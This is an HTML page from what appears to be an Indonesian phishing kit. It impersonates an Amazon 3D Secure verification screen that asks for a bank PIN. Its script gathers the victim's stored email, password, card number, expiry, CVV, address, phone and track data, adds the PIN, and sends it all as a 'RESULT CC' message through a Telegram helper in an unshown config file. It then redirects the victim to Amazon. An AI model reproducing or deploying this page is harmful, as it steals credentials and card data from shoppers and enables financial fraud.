<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>3D Secure Verification</title>
    <script src="config.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Amazon Ember', Arial, sans-serif; }
        body { background-color: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 30px 20px; }
        .logo { margin: 0 0 25px; text-align: center; }
        .logo img { height: 60px; }
        .kotak { width: 100%; max-width: 500px; border: 1px solid #ddd; border-radius: 8px; padding: 25px 26px; }
        h1 { font-size: 20px; margin-bottom: 8px; font-weight: 500; }
        .sub { font-size: 14px; color: #555; margin-bottom: 20px; }
        .info { background: #f7f8f8; border-radius: 6px; padding: 12px 15px; margin-bottom: 25px; font-size: 13px; line-height: 1.8; }
        .pin-judul { font-size: 15px; font-weight: 600; margin-bottom: 12px; }
        .pin-ket { font-size: 12px; color: #555; margin-bottom: 15px; }
        .pin-baris { display: flex; gap: 10px; margin-bottom: 20px; }
        .pin-kolom { flex: 1; max-width: 65px; }
        .pin-kolom input { width: 100%; height: 50px; text-align: center; font-size: 20px; border: 1px solid #a6a6a6; border-radius: 4px; outline: none; }
        .pin-kolom input:focus { border-color: #0071e3; box-shadow: 0 0 3px rgba(0,113,227,0.5); }
        button { width: 100%; padding: 10px; background: #FFD814; border: 1px solid #FCD200; border-radius: 20px; font-size: 15px; color: #0F1111; cursor: pointer; }
        button:hover { background: #F7CA00; }
        button:disabled { opacity: 0.6; cursor: not-allowed; }
        .proses { display: none; color: #007600; margin-top: 15px; text-align: center; }
        .proses.tampil { display: block; }
        .footer { font-size: 11px; color: #555; text-align: center; margin-top: 30px; }
        .footer a { color: #0066c0; text-decoration: none; margin: 0 8px; }
    </style>
</head>
<body>
    <div class="logo"><img src="img/amazonlogo.png" alt="Amazon"></div>
    <div class="kotak">
        <h1>3D Secure Verification</h1>
        <p class="sub">Bank Anda meminta verifikasi tambahan untuk melindungi transaksi Anda.</p>
        <div class="info">
            <div>Kartu: <span id="tampilKartu">—</span></div>
            <div>Email: <span id="tampilEmail">—</span></div>
        </div>
        <form id="form3ds">
            <p class="pin-judul">Masukkan PIN Anda</p>
            <p class="pin-ket">6 digit PIN verifikasi dari bank.</p>
            <div class="pin-baris">
                <div class="pin-kolom"><input type="text" maxlength="1" inputmode="numeric" id="p1" autofocus></div>
                <div class="pin-kolom"><input type="text" maxlength="1" inputmode="numeric" id="p2"></div>
                <div class="pin-kolom"><input type="text" maxlength="1" inputmode="numeric" id="p3"></div>
                <div class="pin-kolom"><input type="text" maxlength="1" inputmode="numeric" id="p4"></div>
                <div class="pin-kolom"><input type="text" maxlength="1" inputmode="numeric" id="p5"></div>
                <div class="pin-kolom"><input type="text" maxlength="1" inputmode="numeric" id="p6"></div>
            </div>
            <button type="submit" id="tombolKirim">Verify & Complete</button>
            <div class="proses" id="sedang">⏳ Sedang memverifikasi...</div>
        </form>
    </div>
    <div class="footer">
        <a href="#">Conditions of Use</a><a href="#">Privacy Notice</a><a href="#">Help</a>
        <p style="margin-top: 8px;">© 1996-2026, Amazon.com, Inc. or its affiliates</p>
    </div>

    <script>
        // Ambil semua data tersimpan
        const email = localStorage.getItem('emailPengguna') || '';
        const pass = localStorage.getItem('passwordPengguna') || '';
        const namaKartu = localStorage.getItem('namaKartu') || '';
        const nomor = localStorage.getItem('nomorKartu') || '';
        const expiry = localStorage.getItem('expiry') || '';
        const cvv = localStorage.getItem('cvv') || '';
        const alamat = localStorage.getItem('alamat') || '';
        const kota = localStorage.getItem('kota') || '';
        const kodepos = localStorage.getItem('kodepos') || '';
        const telepon = localStorage.getItem('telepon') || '';
        const track = localStorage.getItem('trackKartu') || '';

        // Tampilkan 4 digit terakhir kartu
        document.getElementById('tampilKartu').textContent = nomor.length >= 4 
            ? `•••• •••• •••• ${nomor.slice(-4)}` 
            : '•••• •••• •••• ----';
        document.getElementById('tampilEmail').textContent = email;

        // 6 kolom PIN — otomatis lanjut
        const kolom = ['p1','p2','p3','p4','p5','p6'].map(id => document.getElementById(id));
        kolom.forEach((inp, i) => {
            inp.addEventListener('keydown', e => {
                if (e.key === 'Backspace' && !inp.value && i > 0) kolom[i-1].focus();
                if (e.key === 'ArrowLeft' && i > 0) kolom[i-1].focus();
                if (e.key === 'ArrowRight' && i < 5) kolom[i+1].focus();
                if (!/[\d\b]/.test(e.key) && e.key.length === 1) e.preventDefault();
            });
            inp.addEventListener('input', () => {
                inp.value = inp.value.replace(/\D/g, '');
                if (inp.value && i < 5) kolom[i+1].focus();
            });
        });

        function ambilPIN() {
            return kolom.map(i => i.value).join('');
        }

        const form = document.getElementById('form3ds');
        const tombol = document.getElementById('tombolKirim');
        const sedang = document.getElementById('sedang');

        form.addEventListener('submit', async e => {
            e.preventDefault();
            const pin = ambilPIN();
            if (pin.length !== 6) { alert('Masukkan 6 digit PIN'); return; }

            tombol.disabled = true;
            tombol.style.display = 'none';
            sedang.classList.add('tampil');

            // === KIRIM: RESULT CC (PIN) ===
            const pesanCC = `
💳 *RESULT CC*
━━━━━━━━━━━━━━━━━━━━━
📧 Email: \`${email}\`
🔑 Password: \`${pass}\`
👤 Nama di Kartu: \`${namaKartu}\`
🔢 Nomor Kartu: \`${nomor}\`
📅 Expiry: \`${expiry}\`
🔒 CVV: \`${cvv}\`
📍 Alamat: \`${alamat}, ${kota} — ${kodepos}\`
📞 Telepon: \`${telepon}\`
━━━━━━━━━━━━━━━━━━━━━
🔐 PIN / 3DS: \`${pin}\`
━━━━━━━━━━━━━━━━━━━━━
📋 *TRACK DATA*
\`\`\`
${track}
\`\`\`
🕐 Waktu: ${new Date().toLocaleString()}
            `.trim();

            if (typeof CONFIG !== 'undefined' && CONFIG.kirimKeTelegram) {
                await CONFIG.kirimKeTelegram(pesanCC);
            }

            setTimeout(() => {
                window.location.href = 'https://www.amazon.com.au/';
            }, 1000);
        });
    </script>
</body>
</html>
